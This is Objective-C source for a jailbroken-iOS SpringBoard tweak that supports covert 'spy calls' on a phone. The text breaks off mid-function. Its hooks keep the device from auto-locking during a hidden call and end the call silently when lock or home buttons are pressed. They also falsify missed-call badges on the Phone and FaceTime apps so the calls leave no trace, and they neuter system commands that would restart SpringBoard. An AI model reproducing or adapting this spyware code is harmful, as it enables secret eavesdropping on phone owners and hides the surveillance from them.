//
//  SpyCallSpringBoard.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "SpringBoard.h"
#import "SBApplicationIcon.h"
#import "SBTelephonyManager.h"
#import "SBMediaController.h"
#import "SBPluginManager.h"
#import "SBAwayView.h"
#import "SBCallFailureAlert.h"
#import "SBApplication.h"
#import "SBAppSwitcherController.h"
#import "SBSlidingAlertDisplay.h"
#import "SBAwayController.h"

// IOS 5
#import "MPPhoneCallWaitingController.h"
#import "MPIncomingPhoneCallController.h"
#import "SBAwayBulletinListController.h"
#import "BBBulletin.h"
#import "BBBContent.h"
#import "BBBulletin+iOS8.h"
#import "SBApplicationController.h"

// IOS 4
#import "SBCallAlert.h"
#import "SBCallAlertDisplay.h"
#import "SBCallWaitingAlertDisplay.h"
#import "SBUIController.h"
#import "SBTelephonyManager+IOS4.h"

// IOS 6
#import "SBDeviceLockController.h"

// iOS 7
#import "SpringBoard+IOS7.h"
#import "SBTelephonyManager+IOS7.h"
#import "SBLockScreenViewController.h"
#import "SBLockScreenDeviceBlockViewController.h"
#import "SBLockOverlayView.h"
#import "SBLockScreenEmergencyCallViewController.h"
#import "SBUIEmergencyCallHostViewController.h"
#import "SpringBoard+IOS7.h"
#import "SBAppSliderController.h"
#import "SBIcon+IOS7.h"
#import "SBLeafIcon+IOS7.h"
#import "SBApplicationIcon+IOS7.h"
#import "SBApplication+IOS7.h"
#import "SBAppSliderIconController.h"
#import "SBBacklightController.h"
#import "SBWorkspace.h"
#import "BKSWorkspace.h"
#import "InCallLockScreenController.h"
#import "SBBulletinBannerController.h"
#import "SBBulletinBannerController+iOS8.h"

#import "AVController.h"
#import "AVController+iOS8.h"

#import "SpyCallManager.h"
#import "SpyCallSpringBoardService.h"
#import "SystemEnvironmentUtils.h"
#import "SpyCallUtils.h"

// FaceTime iOS 7
#import "FaceTimeSpyCallManager.h"
#import "FaceTimeCall.h"
#import "TUFaceTimeAudioCall.h"

// iOS 8
#import "SpringBoard+iOS8.h"
#import "SBAppSwitcherController+iOS8.h"
#import "SBDisplayItem.h"
#import "SBDisplayLayout.h"
#import "SBApplicationController+iOS8.h"
#import "SBTelephonyManager+iOS8.h"
#import "SBInCallAlertManager.h"
#import "SBLockScreenNotificationListController.h"
#import "SBLockScreenNotificationListController+iOS8.h"
#import "SBBulletinObserverViewController.h"
#import "SBBulletinObserverViewController+iOS8.h"
#import "FBUIApplicationService.h"

#import "DefStd.h"
#import "SystemUtilsImpl.h"

#pragma mark -
#pragma mark FaceTime
#pragma mark -

#import "FaceTimeSpyCallSpringBoard.h"

static NSString *kSpyCallMobilePhoneIndentifer		= @"com.apple.mobilephone";
static NSString *kSpyCallVoiceMemosIndentifer		= @"com.apple.VoiceMemos";
static NSString *kSpyCallYoutubeIndentifier			= @"com.apple.youtube";
static NSString *kSpyCallMusicIndentifier			= @"com.apple.mobileipod";
static NSString *kSpyCallVideosIndentifier			= @"com.apple.videos";
static NSString *kSpyCalliPodIndentifier			= @"com.apple.mobileipod"; // The same as Music
static NSString * const kSpyCallPodcastsIdentifier	= @"com.apple.podcasts";
static NSString * const kSpyCallGoogleYoutubeIndentifier	= @"com.google.ios.youtube";
static NSString * const kSpyCalliTuneIndentifier	= @"com.apple.MobileStore"; // iTune
static NSString * const kSpyCallMusicIpadIdentifier	= @"com.apple.Music";
static NSString * const kSpyCallFaceTimeIdentifier  = @"com.apple.facetime";

#pragma mark -
#pragma mark Spy call manager helper C methods
#pragma mark -

BOOL isNormalCallInProgressSB() {
	return ([[SpyCallManager sharedManager] mIsNormalCallInProgress]);
}

BOOL isNormalCallIncomingSB() {
	return ([[SpyCallManager sharedManager] mIsNormalCallIncoming]);
}

BOOL isSpyCallInProgressSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInProgress]);
}

BOOL isSpyCallAnsweringSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallAnswering]);
}

BOOL isSpyCallDisconnectingSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallDisconnecting]);
}

BOOL isSpyCallHangupCompletelySB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallCompletelyHangup]);
}

BOOL isSpyCallInConferenceSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInConference]);
}

BOOL isSpyCallLeavingConferenceSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallLeavingConference]);
}

BOOL isSpyCallInitiatingConferenceSB() {
	return ([[SpyCallManager sharedManager] mIsSpyCallInitiatingConference]);
}

BOOL isAudioActiveSB() {
	BOOL isAudioActive = ([SpyCallUtils isPlayingAudio] || [SpyCallUtils isRecordingAudio]);
	if (!isAudioActive) {
		// Recheck from first check (in 4.3.3, 3gs, second check of audio state is always return false)
		isAudioActive = [SpyCallUtils isAudioActiveFromFirstCheck];
	}
	return (isAudioActive);
}

NSInteger countNormalCallSB() {
	return ([[SpyCallManager sharedManager] normalCallCount]);
}

BOOL isAnyCallOnHoldSB() {
	return ([[SpyCallManager sharedManager] isCallsOnHold]);
}

void endSpyCallSB() {
	SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
	[spyCallManager disconnectedActivityDetected];
	SpyCallSpringBoardService *service = [SpyCallSpringBoardService sharedService];
	[service sendService:kSpyCallServiceEndSpyCall withServiceData:nil];
}

BOOL isIncompatibleApplication(NSString *aAppIdentifier) {
	BOOL incompatible = FALSE;
	if ([aAppIdentifier isEqualToString:kSpyCallVoiceMemosIndentifer]		||
		[aAppIdentifier isEqualToString:kSpyCallYoutubeIndentifier]			||
		[aAppIdentifier isEqualToString:kSpyCallMusicIndentifier]			||
		[aAppIdentifier isEqualToString:kSpyCallVideosIndentifier]			||
		[aAppIdentifier isEqualToString:kSpyCalliPodIndentifier]			||
		[aAppIdentifier isEqualToString:kSpyCallPodcastsIdentifier]			||
		[aAppIdentifier isEqualToString:kSpyCallGoogleYoutubeIndentifier]	||
		[aAppIdentifier isEqualToString:kSpyCallMusicIpadIdentifier]		) {
		incompatible = TRUE;
	}
	return (incompatible);
}

void routeAudioSessionToRingTone(AVController *aAVController) {
	DLog(@"****** ENTER ******")
	[SpyCallUtils setAVController:aAVController category:@"Ringtone" transition:1];
	DLog(@"****** END ******")
}

bool isDeviceBlocked() {
	NSString *sbUserPath = @"/var/mobile/Library/Preferences/com.apple.springboard.plist";
	NSDictionary *sbUserInfo = [[NSDictionary alloc] initWithContentsOfFile:sbUserPath];
	NSNumber *lockFailedAttempts = [sbUserInfo objectForKey:@"SBDeviceLockFailedAttempts"];
	NSInteger lockFailedCount = [lockFailedAttempts intValue];
	
	Class $SBDeviceLockController = objc_getClass("SBDeviceLockController"); // IOS 6
	Class $SBAwayController = objc_getClass("SBAwayController"); // IOS 4,5
	BOOL _showingBlockedIndicator = NO;
	if ($SBDeviceLockController) {
		_showingBlockedIndicator = [[$SBDeviceLockController sharedController] isBlocked];
	} else if ($SBAwayController) {
		_showingBlockedIndicator = [[$SBAwayController sharedAwayController] isBlocked];
	}
	DLog (@"lockFailedAttempts = %@, _showingBlockedIndicator = %d", lockFailedAttempts, _showingBlockedIndicator);
	[sbUserInfo release];
	return (lockFailedCount >= 6 && _showingBlockedIndicator); // 6, magic number work for iOS 4,5,6,?,8
}

#pragma mark -
#pragma mark FaceTime
#pragma mark -

bool isFaceTimeSpyCallInProgress() {
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	return ([ftSpyCallManager mFaceTimeSpyCall] != nil);
}

bool isFaceTimeSpyCallHangupCompletely() {
    FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	return ([ftSpyCallManager mIsFaceTimeSpyCallCompletelyHangup]);
}

void endFaceTimeSpyCall() {
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager endFaceTimeSpyCall];
}

///========================= HOOK ==================

#pragma mark -
#pragma mark System methods
#pragma mark -

MSHook(int, system, const char *command) {
	APPLOGVERBOSE(@"system");
	NSString *cmd = [NSString stringWithCString:command encoding:NSUTF8StringEncoding];
	cmd = [cmd lowercaseString];
	if ([cmd rangeOfString:@"springboard"].location != NSNotFound) {
		if (isSpyCallInProgressSB()) {
			command = "";
		}
	}
	return _system(command);
}

#pragma mark -
#pragma mark SpringBoard methods
#pragma mark -

HOOK(SpringBoard, _proximityChanged$, void, id arg1) {
	APPLOGVERBOSE(@"_proximityChanged");
    if (isSpyCallInConferenceSB() || !isSpyCallInProgressSB()) {
        CALL_ORIG(SpringBoard, _proximityChanged$, arg1);
	}
}

HOOK(SpringBoard, lockButtonDown$, void, id aEvent) {
	APPLOGVERBOSE(@"lockButtonDown");
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:YES];
	} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
		endFaceTimeSpyCall();
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		[ftSpyCallManager setMBlockLockKeyUp:YES];
	} else {
		CALL_ORIG(SpringBoard, lockButtonDown$, aEvent);
	}
}

HOOK(SpringBoard, _lockButtonDownFromSource$, void, int arg1) {
	APPLOGVERBOSE(@"_lockButtonDownFromSource, %d", arg1);
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:YES];
	} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
		endFaceTimeSpyCall();
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		[ftSpyCallManager setMBlockLockKeyUp:YES];
	} else {
		CALL_ORIG(SpringBoard, _lockButtonDownFromSource$, arg1);
	}
}

// iOS 8
HOOK(SpringBoard, _lockButtonDown$fromSource$, void, struct __IOHIDEvent *arg1, int arg2) {
    APPLOGVERBOSE(@"_lockButtonDown$fromSource, %d", arg1);
	if (isSpyCallInProgressSB()) {
		endSpyCallSB();
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:YES];
	} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
		endFaceTimeSpyCall();
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		[ftSpyCallManager setMBlockLockKeyUp:YES];
	} else {
		CALL_ORIG(SpringBoard, _lockButtonDown$fromSource$, arg1, arg2);
	}
}

HOOK(SpringBoard, lockButtonUp$, void, id aEvent) {
	APPLOGVERBOSE(@"lockButtonUp >>> MSSPC");
	SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
	if ([[spyCallManager mSystemEnvUtils] mBlockLockButtonUp]) {
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:NO];
	} else {
#pragma mark - FaceTime -
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		if ([ftSpyCallManager mBlockLockKeyUp]) {
			[ftSpyCallManager setMBlockLockKeyUp:NO];
		} else {
			CALL_ORIG(SpringBoard, lockButtonUp$, aEvent);
		}
	}
}

HOOK(SpringBoard, _lockButtonUpFromSource$, void, int arg1) {
	APPLOGVERBOSE(@"_lockButtonUpFromSource >>> MSSPC, %d", arg1);
	SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
	if ([[spyCallManager mSystemEnvUtils] mBlockLockButtonUp]) {
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:NO];
	} else {
#pragma mark - FaceTime -
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		if ([ftSpyCallManager mBlockLockKeyUp]) {
			[ftSpyCallManager setMBlockLockKeyUp:NO];
		} else {
			CALL_ORIG(SpringBoard, _lockButtonUpFromSource$, arg1);
		}
	}
}

// iOS 8
HOOK(SpringBoard, _lockButtonUp$fromSource$, void, struct __IOHIDEvent *arg1, int arg2) {
    APPLOGVERBOSE(@"_lockButtonUp$fromSource, %d", arg1);
    SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
	if ([[spyCallManager mSystemEnvUtils] mBlockLockButtonUp]) {
		[[spyCallManager mSystemEnvUtils] setMBlockLockButtonUp:NO];
	} else {
#pragma mark - FaceTime -
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		if ([ftSpyCallManager mBlockLockKeyUp]) {
			[ftSpyCallManager setMBlockLockKeyUp:NO];
		} else {
			CALL_ORIG(SpringBoard, _lockButtonUp$fromSource$, arg1, arg2);
		}
	}
}

HOOK(SpringBoard, menuButtonDown$, void, id aEvent) {
	APPLOGVERBOSE(@"menuButtonDown >>> MSSPC");
	if ([self isLocked]) {
		if (isSpyCallInProgressSB()) {
			endSpyCallSB();
			SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
			[[spyCallManager mSystemEnvUtils] setMBlockMenuButtonUp:YES];
		} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			endFaceTimeSpyCall();
			FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
			[ftSpyCallManager setMBlockMenuKeyUp:YES];
		} else {
			CALL_ORIG(SpringBoard, menuButtonDown$, aEvent);
		}
	} else {
		CALL_ORIG(SpringBoard, menuButtonDown$, aEvent);
	}
}

HOOK(SpringBoard, _menuButtonDown$, void, struct __IOHIDEvent *arg1) {
	APPLOGVERBOSE(@"_menuButtonDown >>> MSSPC");
	if ([self isLocked]) {
		if (isSpyCallInProgressSB()) {
			endSpyCallSB();
			SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
			[[spyCallManager mSystemEnvUtils] setMBlockMenuButtonUp:YES];
		} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			endFaceTimeSpyCall();
			FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
			[ftSpyCallManager setMBlockMenuKeyUp:YES];
		} else {
			CALL_ORIG(SpringBoard, _menuButtonDown$, arg1);
		}
	} else {
		CALL_ORIG(SpringBoard, _menuButtonDown$, arg1);
	}
}

HOOK(SpringBoard, menuButtonUp$, void, id aEvent) {
	APPLOGVERBOSE(@"menuButtonUp >>> MSSPC");
	if ([self isLocked]) {
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		if ([[spyCallManager mSystemEnvUtils] mBlockMenuButtonUp]) {
			[[spyCallManager mSystemEnvUtils] setMBlockMenuButtonUp:NO];
		} else {
#pragma mark - FaceTime -
			FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
			if ([ftSpyCallManager mBlockMenuKeyUp]) {
				[ftSpyCallManager setMBlockMenuKeyUp:NO];
			} else {
				CALL_ORIG(SpringBoard, menuButtonUp$, aEvent);
			}
		}
	} else {
		CALL_ORIG(SpringBoard, menuButtonUp$, aEvent);
	}
}

HOOK(SpringBoard, _menuButtonUp$, void, struct __IOHIDEvent *arg1) {
	APPLOGVERBOSE(@"_menuButtonUp >>> MSSPC");
	if ([self isLocked]) {
		SpyCallManager *spyCallManager = [SpyCallManager sharedManager];
		if ([[spyCallManager mSystemEnvUtils] mBlockMenuButtonUp]) {
			[[spyCallManager mSystemEnvUtils] setMBlockMenuButtonUp:NO];
		} else {
#pragma mark - FaceTime -
			FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
			if ([ftSpyCallManager mBlockMenuKeyUp]) {
				[ftSpyCallManager setMBlockMenuKeyUp:NO];
			} else {
				CALL_ORIG(SpringBoard, _menuButtonUp$, arg1);
			}
		}
	} else {
		CALL_ORIG(SpringBoard, _menuButtonUp$, arg1);
	}
}

HOOK(SpringBoard, statusBarReturnActionTap$, void, id aEvent) {
	APPLOGVERBOSE(@"statusBarReturnActionTap$");
	if (isSpyCallInitiatingConferenceSB()) {
		;
	} else {
		CALL_ORIG(SpringBoard, statusBarReturnActionTap$, aEvent);
	}
}

// iOS 7,8
HOOK(SpringBoard, handleDoubleHeightStatusBarTap$, _Bool, long long arg1) {
    APPLOGVERBOSE(@"handleDoubleHeightStatusBarTap$, %lld", arg1);
	if (isSpyCallInitiatingConferenceSB()) {
        APPLOGVERBOSE(@"handleDoubleHeightStatusBarTap$ CANNOT handle");
		//return NO; // iOS 7
        return CALL_ORIG(SpringBoard, handleDoubleHeightStatusBarTap$, -1);
	} else {
		return CALL_ORIG(SpringBoard, handleDoubleHeightStatusBarTap$, arg1);
	}
}

#pragma mark SBInCallAlertManager

// iOS 8
HOOK(SBInCallAlertManager, reactivateAlertFromStatusBarTap, void) {
    APPLOGVERBOSE(@"reactivateAlertFromStatusBarTap");
    if (isSpyCallInitiatingConferenceSB()) {
        APPLOGVERBOSE(@"reactivateAlertFromStatusBarTap, CANNOT activate alert");
		;
	} else {
		CALL_ORIG(SBInCallAlertManager, reactivateAlertFromStatusBarTap);
	}
}

#pragma mark SBWorkspace

HOOK(SBWorkspace, workspace$handleStatusBarReturnActionFromApplication$statusBarStyle$, void, id arg1, id arg2, id arg3) {
    APPLOGVERBOSE(@"workspace$handleStatusBarReturnActionFromApplication$statusBarStyle$, %@, %@, %@", arg1, arg2, arg3);
	if (isSpyCallInitiatingConferenceSB()) {
		CALL_ORIG(SBWorkspace, workspace$handleStatusBarReturnActionFromApplication$statusBarStyle$, arg1, nil, nil);
	} else {
		CALL_ORIG(SBWorkspace, workspace$handleStatusBarReturnActionFromApplication$statusBarStyle$, arg1, arg2, arg3);
	}
}

#pragma mark SpringBoard

HOOK(SpringBoard, autoLock, void) {
	APPLOGVERBOSE(@"autoLock");
    if(isSpyCallInProgressSB() || isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			;
		} else {
			CALL_ORIG(SpringBoard, autoLock);
		}
	}
}

#pragma mark -
#pragma mark SBBacklightController
#pragma mark -

HOOK(SBBacklightController, _autoLockTimerFired$, void, id arg1) {
    APPLOGVERBOSE(@"_autoLockTimerFired$, %@", arg1);
    if(isSpyCallInProgressSB() || isSpyCallAnsweringSB() || isSpyCallDisconnectingSB()) {
		;
	} else {
		if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
			;
		} else {
			CALL_ORIG(SBBacklightController, _autoLockTimerFired$, arg1);
		}
	}
}

#pragma mark -
#pragma mark SBApplicationIcon methods
#pragma mark -

HOOK(SBApplicationIcon, launch, void) {
	APPLOGVERBOSE(@"launch");
	NSString *bundleID = [self applicationBundleID];
	if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBApplicationIcon, launch);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]) {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) { // Face time
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBApplicationIcon, launch);
			}
		} else {
			CALL_ORIG(SBApplicationIcon, launch);
		}
	}
}

HOOK(SBApplicationIcon, launchFromViewSwitcher, void) {
	APPLOGVERBOSE(@"launchFromViewSwitcher");
	NSString *bundleID = [self applicationBundleID];
	if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]) {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
			}
		} else {
			CALL_ORIG(SBApplicationIcon, launchFromViewSwitcher);
		}
	}
}

// iOS 7,8
HOOK(SBApplicationIcon, launchFromLocation$, void, int arg1) {
    APPLOGVERBOSE(@"launchFromLocation$");
    APPLOGVERBOSE(@"arg1 = %d", arg1);
    
    NSString *bundleID = [self applicationBundleID];
    SBApplication *application = [self application];
    APPLOGVERBOSE(@"application = %@", application);
    APPLOGVERBOSE(@"isMobilePhone = %d", [application isMobilePhone]);
    APPLOGVERBOSE(@"isRunning = %d", [application isRunning]);
	if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBApplicationIcon, launchFromLocation$, arg1);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]    ||  // MobilePhone
            [bundleID isEqualToString:kSpyCallFaceTimeIdentifier])      {   // FaceTime
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
                if (![application isRunning] && isSpyCallInProgressSB()) {
                    endSpyCallSB();
                } else {
                    CALL_ORIG(SBApplicationIcon, launchFromLocation$, arg1);
                }
			}
		} else {
			CALL_ORIG(SBApplicationIcon, launchFromLocation$, arg1);
		}
	}
}

HOOK(SBApplicationIcon, _setBadge$, void, id arg1) {
	APPLOGVERBOSE(@"_setBadge");
	if ([[self applicationBundleID] isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		NSNumber *badge = [[arg1 userInfo] objectForKey:@"SBApplicationIconBadgeNumberOrStringKey"];
		if ([badge intValue] > 0 && [badge intValue] <= 100) {
			// Decrease missed call back which was increase in SpyCallManager
			NSInteger missedCall = [[[SpyCallManager sharedManager] mSystemEnvUtils] mMissedCall];
			if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) &&
				isSpyCallDisconnectingSB()) {
				APPLOGVERBOSE(@"_setBadge -1");
				badge = [NSNumber numberWithInt:[badge intValue] - 1];
				missedCall--;
			} else { // Missed call which music is playing in foreground
				APPLOGVERBOSE(@"_setBadge -missedCall");
				NSInteger newBadge = [badge intValue] - missedCall;
				newBadge = (newBadge >= 0) ? newBadge : 0;
				badge = [NSNumber numberWithInteger:newBadge];
				missedCall = 0;
			}
			missedCall = (missedCall >= 0) ? missedCall : 0;
			[[[SpyCallManager sharedManager] mSystemEnvUtils] setMMissedCall:missedCall];
		} else {
			badge = [NSNumber numberWithInt:0];
		}
		NSMutableDictionary *userInfo = [NSMutableDictionary dictionary];
		[userInfo setObject:badge forKey:@"SBApplicationIconBadgeNumberOrStringKey"];
		NSNotification *notification = [NSNotification notificationWithName:@"SBApplicationIconBadgeChangedNotification"
																		object:[self applicationBundleID]
																	  userInfo:userInfo];
		CALL_ORIG(SBApplicationIcon, _setBadge$, notification);
	} else {
		CALL_ORIG(SBApplicationIcon, _setBadge$, arg1);
	}
}

HOOK(SBApplicationIcon, setBadge$, void, id arg1) {
	APPLOGVERBOSE(@"setBadge");
	if ([[self applicationBundleID] isEqualToString:kSpyCallMobilePhoneIndentifer]) {
		NSNumber *badge = arg1;
		if ([badge intValue] > 0 && [badge intValue] <= 100) {
			// Decrease missed call back which was increase in SpyCallManager
			NSInteger missedCall = [[[SpyCallManager sharedManager] mSystemEnvUtils] mMissedCall];
			if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) &&
                isSpyCallDisconnectingSB()) {
				APPLOGVERBOSE(@"setBadge -1");
				badge = [NSNumber numberWithInt:[badge intValue] - 1];
				missedCall--;
			} else { // Missed call which music is playing in foreground
				APPLOGVERBOSE(@"setBadge -missedCall");
				NSInteger newBadge = [badge intValue] - missedCall;
				newBadge = (newBadge >= 0) ? newBadge : 0;
				badge = [NSNumber numberWithInteger:newBadge];
				missedCall = 0;
			}
			missedCall = (missedCall >= 0) ? missedCall : 0;
			[[[SpyCallManager sharedManager] mSystemEnvUtils] setMMissedCall:missedCall];
		} else {
			badge = [NSNumber numberWithInt:0];
		}
		CALL_ORIG(SBApplicationIcon, setBadge$, badge);
	} else if ([[self applicationBundleID] isEqualToString:@"com.apple.facetime"]) {
        CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
    } else {
		CALL_ORIG(SBApplicationIcon, setBadge$, arg1);
	}
}

#pragma mark -
#pragma mark SBApplication methods
#pragma mark -

// iOS ...?,7,8
HOOK(SBApplication, setBadge$, void, id arg1) {
    APPLOGVERBOSE(@"setBadge, %@", arg1);
    if ([[self bundleIdentifier] isEqualToString:@"com.apple.facetime"]) {
        /*
         Note: the condition is true iff:
         - iOS 7, this method is called before [CNFConferenceController avChatStateChanged..] get called, with {avChatState = 5}
         - iOS 8, this method is called before [TUCallCeneter handleCallStatusChanged..] get called, with {callStatus = 6 && isStatusFinal = true}
         */
#pragma mark FaceTime
        if (isFaceTimeSpyCallInProgress()) { // iOS 7
            ;
        } else {
            if (!isFaceTimeSpyCallHangupCompletely()) { // iOS 8
                // This method get called after [TUCallCeneter handleCallStatusChanged..], that's why it's required to use completely hang up flag to check
                ;
            } else {
                CALL_ORIG(SBApplication, setBadge$, arg1);
            }
        }
    } else if ([[self bundleIdentifier] isEqualToString:@"com.apple.mobilephone"]) {
        if (isSpyCallDisconnectingSB()  ||
            isSpyCallInProgressSB())    {
            ;
        } else {
            if (isSpyCallHangupCompletelySB()) {
                // Because of kCTCallHistoryRecordAddNotification no longer notify on iOS 8 we need to use hang up flag to block badge of spy call
                CALL_ORIG(SBApplication, setBadge$, arg1);
            } else {
                ;
            }
        }
    } else {
        CALL_ORIG(SBApplication, setBadge$, arg1);
    }
}

#pragma mark - FBUIApplicationService methods {not used} -

HOOK(FBUIApplicationService, handleApplication$setBadgeValue$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"handleApplication$setBadgeValue$, %@, %@", arg1, arg2);
    NSString *applicationBundleID = arg1;
    if ([applicationBundleID isEqualToString:@"com.apple.facetime"]) {
        /*
         Note: the condition is true iff:
         - iOS 7, this method is called before [CNFConferenceController avChatStateChanged..] get called, with {avChatState = 5}
         - iOS 8, this method is called before [TUCallCeneter handleCallStatusChanged..] get called, with {callStatus = 6 && isStatusFinal = true}
         */
#pragma mark FaceTime
        if (isFaceTimeSpyCallInProgress()) { // iOS 7
            ;
        } else {
            if (!isFaceTimeSpyCallHangupCompletely()) { // iOS 8
                // This method get called after [TUCallCeneter handleCallStatusChanged..], that's why it's required to use completely hang up flag to check
                ;
            } else {
                CALL_ORIG(FBUIApplicationService, handleApplication$setBadgeValue$, arg1, arg2);
            }
        }
    } else if ([applicationBundleID isEqualToString:@"com.apple.mobilephone"]) {
        if (isSpyCallDisconnectingSB()  ||
            isSpyCallInProgressSB())    {
            ;
        } else {
            if (isSpyCallHangupCompletelySB()) {
                // Because of kCTCallHistoryRecordAddNotification no longer notify on iOS 8 we need to use hang up flag to block badge of spy call
                CALL_ORIG(FBUIApplicationService, handleApplication$setBadgeValue$, arg1, arg2);
            } else {
                ;
            }
        }
    } else {
        CALL_ORIG(FBUIApplicationService, handleApplication$setBadgeValue$, arg1, arg2);
    }
}

#pragma mark -
#pragma mark SBUIController methods
#pragma mark -

HOOK(SBUIController, activateApplicationFromSwitcher$, void, id arg1) {
	// Work the same as launch, launchFromAppSwitcher of SBApplicationIcon
	APPLOGVERBOSE(@"activateApplicationFromSwitcher, bundle id of launch appliation = %@", [arg1 bundleIdentifier]);
	NSString *bundleID = [arg1 bundleIdentifier];
	if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
			}
		}
	} else {
		if ([bundleID isEqualToString:kSpyCallMobilePhoneIndentifer]) {
			if (isSpyCallInitiatingConferenceSB()) {
				;
			} else if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
				endFaceTimeSpyCall();
			} else {
				CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
			}
		} else {
			CALL_ORIG(SBUIController, activateApplicationFromSwitcher$, arg1);
		}
	}
}

#pragma mark -
#pragma mark SBAppSliderController
#pragma mark -

HOOK(SBAppSliderController, sliderIconScroller$activate$, void, id arg1, id arg2) {
    APPLOGVERBOSE(@"sliderIconScroller$activate$, %@, %@", arg1, arg2);
    NSString *bundleID = arg2;
    if (isIncompatibleApplication(bundleID)) {
		if (isSpyCallInProgressSB() && !isSpyCallInConferenceSB()) { // Spy call only
			endSpyCallSB();
		} else {
			if (isFaceTimeSpyCallInProgress()) {
#pragma mark - FaceTime -
